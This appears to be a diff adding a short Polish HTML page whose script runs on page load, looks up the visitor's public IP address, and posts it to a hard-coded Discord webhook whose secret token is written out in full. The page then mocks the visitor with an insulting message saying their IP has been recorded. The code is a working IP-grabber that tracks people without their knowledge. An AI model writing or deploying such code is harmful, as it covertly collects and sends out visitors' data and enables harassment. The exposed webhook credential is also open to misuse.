@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hrystek</title>
+    <script>
+        async function getIPAndSendToDiscord() {
+            try {
+                // Pobierz IP użytkownika z zewnętrznego serwisu
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const userIP = data.ip;
+                
+                // Adres URL webhooka Discorda
+                const webhookURL = 'https://discord.com/api/webhooks/1268134755929428032/mRTUevQzdNI6oQ2i29Q1ta8QdDEvft0I_fbcqZ9znG9GeLyMAPDUmOsUYfEesGt3Mt85';
+
+                // Przygotuj dane do wysłania
+                const payload = {
+                    content: `Użytkownik wszedł na stronę z IP: ${userIP}`
+                };
+
+                // Wyślij dane do webhooka Discorda
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                console.log('Adres IP został wysłany na Discorda:', userIP);
+            } catch (error) {
+                console.error('Wystąpił błąd:', error);
+            }
+        }
+
+        // Uruchom funkcję po załadowaniu strony
+        window.onload = getIPAndSendToDiscord;
+    </script>
+</head>
+<body>
+    <h1>Witamy z tej strony Ynglean!!!! ⬇⬇⬇</h1>
+    <p>Twoje IP zostało zarejestrowane Kurewko</p>
+</body>
+</html>
